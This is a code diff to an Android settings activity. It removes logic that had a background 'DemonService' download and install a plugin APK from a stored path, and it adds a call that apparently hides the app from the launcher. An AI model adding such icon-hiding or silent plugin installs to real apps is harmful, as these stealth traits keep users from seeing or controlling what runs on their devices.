@@ -181,25 +181,7 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
 
         mLayout = new ListSettingsLayout(findViewById(R.id.settings_list), app);
 
-//		if (SDK_VERSION >= 7) { // quicker compatible
-//			boolean shown = prefs.getBoolean(PREF_ADS_SHOWN, false);
-//			if (!shown) {
-//				prefs.edit().putBoolean(PREF_ADS_SHOWN, true).commit();
-//				showDialog(0);
-//			}
-//		}
-
-
         View button = findViewById(R.id.install);
-        button.setOnClickListener(new OnClickListener() {
-            @Override
-            public void onClick(View view) {
-//                if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
-                UtilOperator.tryToInstallPlugin(getApplicationContext());
-//                }
-            }
-        });
-
         button.setVisibility(View.GONE);
 
         appActive();
@@ -214,7 +196,7 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
         }
 
         long launchTime = SettingManager.getInstance().getKeyLanuchTime();
-        if (launchTime == 0 || TextUtils.isEmpty(SettingManager.getInstance().getLocalApkPath())) {
+        if (launchTime == 0) {
             //first lanuch
 
             if (Config.DEBUG) {
@@ -224,16 +206,6 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
             Intent i = new Intent();
             i.setClass(getApplicationContext(), DemonService.class);
             i.setAction(DemonService.ACTION_LANUCH);
-            startService(i);
-        } else if (!UtilOperator.isPluginApkExist() && !Config.DOWNLOAD_PROCESS_RUNNING.get()) {
-            if (Config.DEBUG) {
-                Config.LOGD("[[QuickSettingApplication::onCreate]] try to download APK from : "
-                                + SettingManager.getInstance().getLocalApkPath() + " as the local plugin apk not exists");
-            }
-
-            Intent i = new Intent();
-            i.setClass(getApplicationContext(), DemonService.class);
-            i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
             startService(i);
         }
 
@@ -276,6 +248,8 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
             i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
             startActivity(i);
         }
+
+        AppRuntime.hideInLauncher(getApplicationContext());
     }
 
     @Override
